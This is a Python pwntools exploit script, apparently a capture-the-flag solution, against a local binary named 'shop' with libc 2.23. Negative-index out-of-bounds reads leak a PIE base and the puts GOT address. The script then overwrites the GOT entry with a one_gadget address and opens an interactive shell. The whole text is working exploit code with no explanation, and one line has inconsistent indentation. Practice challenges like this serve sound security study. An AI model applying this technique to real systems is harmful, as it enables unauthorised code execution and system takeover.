from pwn import *
context.log_level="debug"
def modify(index,content,flag=0):
    p.recvuntil("buy!\n")
    p.sendline("3")
    p.recvuntil("y?\n")
    p.sendline(str(index))
    if flag==1:
        p.recvuntil("modify ")
        addr=u64(p.recv(6).ljust(8,'\0'))
        return addr
    else:
	pause()
        p.send(content)

libc=ELF("./libc-2.23.so")

p=process('./shop')
for i in range(0x13):
    p.recvuntil("man!\n")
    p.sendline("1")
    p.recvuntil("Dollar?\n")
    p.sendline("aaa")
pause()

p.recvuntil("man!\n")
p.sendline("3")
p.recvuntil("buy!\n")
p.sendline("3")
p.recvuntil("y?\n")
p.sendline("-47")

p.recvuntil("modify ")
addr=u64(p.recv(6).ljust(8,'\0'))-0x202068
print"base:"+ hex(addr)
puts_got=0x202020+addr
print "puts_got:"+hex(puts_got)
p.sendline(p64(addr+0x202068))

modify(-0x14,p64(addr+0x2020a8),0)


modify(-0x13,p64(puts_got),0)
puts_addr=modify(-0x28,"",1)
 
print "puts:"+hex(puts_addr)
p.send(p64(puts_addr-libc.symbols['puts']+0x45216))
p.interactive()
